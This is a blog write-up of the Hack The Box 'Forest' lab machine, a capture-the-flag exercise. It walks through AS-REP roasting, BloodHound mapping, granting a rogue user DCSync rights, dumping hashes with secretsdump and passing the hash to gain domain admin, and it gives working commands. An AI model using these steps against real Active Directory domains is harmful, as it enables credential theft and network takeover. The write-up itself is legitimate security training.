![intro](https://an00brektn.github.io/img/htb-forest/Pasted%20image%2020210903122049.png)

## Intro
I'm pretty new to doing Hack The Box, so Forest is one the boxes that I rooted as part of the Take It Easy Dare, which taught me a good amount about approaching Active Directory machines. Forest is a domain controller with two domains, although that part isn't as relevant. I'll begin by enumerating common ports, and find users from RPC. One of the users I find is AS-REP roastable, which will allow me to get user. From there, I'll create a user with DCSync Rights so I can dump the system hashes, and pass the hash my way to domain admin.

## Recon
I always like to start my AD/Windows enumeration with nmap and enum4linux.

**Nmap** shows us a lot of typical Windows ports open:

I also like using [enum4linux-ng](https://github.com/cddmp/enum4linux-ng) which is just a better version of the `enum4linux.pl` that comes with Kali.

```

From this we gain the following information:
- This is an Active Directory DC as evidenced by the presence of ports like 88 (Kerberos)
- Domain is `htb.local`
- We could get an Evil-WinRM shell due to the presence of port 5985

But more importantly...
- We have a list of users and groups from enumerating RPC using `enum4linux-ng`

There are a bunch of random program users that aren't likely to be the avenue to foothold, so I'm just going to add the users and service accounts that seem reasonsable to add to a users list.

```shell
kali@kali:~/ctf/htb/forest$ cat users.txt
Administrator
sebastien
lucinda
andy
mark
santi
svc-alfresco
```

I'm going to add `htb.local` to my `/etc/hosts` file to make it easier for myself when typing out commands. I know `smbclient` won't really work without credentials because of the enum4linux output, so I think I'll start by AS-REP roasting the users I got since I don't really have any other leads.

AS-REP roasting exploits a permission known as `UF_DONT_REQUIRE_PREAUTH`, where, if set to true, a user doesn't need to preauthenticate with Kerberos to get their ticket. We can abuse this to grab the Ticket Granting Ticket that a user would use to authenticate to Kerberos without needing their password.

```shell
kali@kali:~/ctf/htb/forest$ cat users.txt | while read line; do python3 /opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.10.161 htb.local/$line -no-pass; done

```

Which we definitely can.

## Privesc to Administrator

Since the box is called Forest, I don't anticipate needing to run [winPEAS](https://github.com/carlospolop/PEASS-ng), although I normally would. In this case, I'm going to jump straight to Bloodhound, a tool that can map out relationships in an Active Directory environment to advise us as to what to do next. 
- Install bloodhound and neo4j: `sudo apt install bloodhound neo4j`
- Download PowerView: [[link](https://github.com/PowerShellMafia/PowerSploit)]

I'm going to copy `SharpHound.ps1` and `PowerView.ps1` to the DC using `evil-winrm`'s built in upload and download command:
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload ./www/PowerView.ps1 .
Info: Uploading ./www/PowerView.ps1 to .                                      
Data: 1027036 bytes of 1027036 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload ./www/SharpHound.ps1 .
Info: Uploading ./www/SharpHound.ps1 to .                                         
Data: 1298980 bytes of 1298980 bytes copied

Info: Upload successful!
```

Once I've uploaded both powershell modules, I'll import them by doing `. .\SharpHound.ps1` and `. .\PowerView.ps1`. It might look weird, but this way of doing it has always been most consistent for me.

On my Kali machine, I'm going to start bloodhound by running `bloodhound`, and start the `neo4j` database using `sudo neo4j console`. I'll sign in as needed.

After that's taken care of, I'll run the following command on the DC:
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Invoke-Bloodhound -CollectionMethod All -Domain htb.local -ZipFileName lootme.zip
```

This will allow me to collect all of the Active Directory data that this service account has to offer. I'll download the zip file that comes off of it, and drag and drop it right into Bloodhound. After that's unzipped and loaded in, I'll mark `svc-alfresco` as "owned" and look for "Shortest Path to Domain Admins".

![asdf](https://an00brektn.github.io/img/htb-forest/Pasted%20image%2020210903163250.png)

*Your path might look different than mine, but these privesc steps are all the same.*

Here we see a fairly large graph. As you'll notice, there are actually two domains in this environment, `htb.local` and `forest.htb.local`, which is why this box is named the way it is (2 joined domains are a forest).

From svc-alfresco, marked with a skull, we see two jumps necessary to get to domain admin. Since svc-alfresco is a part of the Account Operators group, it has the generic all privilege on the Exchange Windows Permissions group. Right clicking the edge to learn more, we find the following abuse info:

![asdf](https://an00brektn.github.io/img/htb-forest/Pasted%20image%2020210903163652.png)

Essentially, this means we can give our account, or any account, DCSync Privileges, which can allow us to run secretsdump.py or mimikatz to dump hashes. If this works, we can use the NT hash we get to pass the hash and become administrator.

## Shell as Administrator

Since this is a public box, I don't want to make it easy so I'll make my own account first and add it to the Exchange Windows Permissions group.
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user An00bRektn An00bRektn /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" /add An00bRektn
The command completed successfully.
```

We then attempt give ourselves DC Sync Rights according to the Bloodhound Abuse Info.
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $SecPassword = ConvertTo-SecureString 'An00bRektn' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $Cred = New-Object System.Management.Automation.PSCredential('HTB\An00bRektn', $SecPassword)
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync
The term 'Add-DomainObjectAcl' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Righ ...
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Add-DomainObjectAcl:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
```

As you can see, Add-DomainObjectAcl wasn't working. I took to Google, and found that I might need to specify a TargetIdentity and PrincipalIdentity. After some adjustments, we run it again.
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity An00bRektn -Rights DCSync
```

We can then use secretsdump.py from impacket to dump all of the system hashes (output not shown because spoilers).

```shell
kali@kali:~/ctf/htb/forest$ python3 /opt/impacket/examples/secretsdump.py -just-dc An00bRektn@htb.local
```

We pass the hash using `evil-winrm` and grab the root flag.

```shell
kali@kali:~/ctf/htb/forest$ evil-winrm -u Administrator -H 32693b11************************ -i htb.local
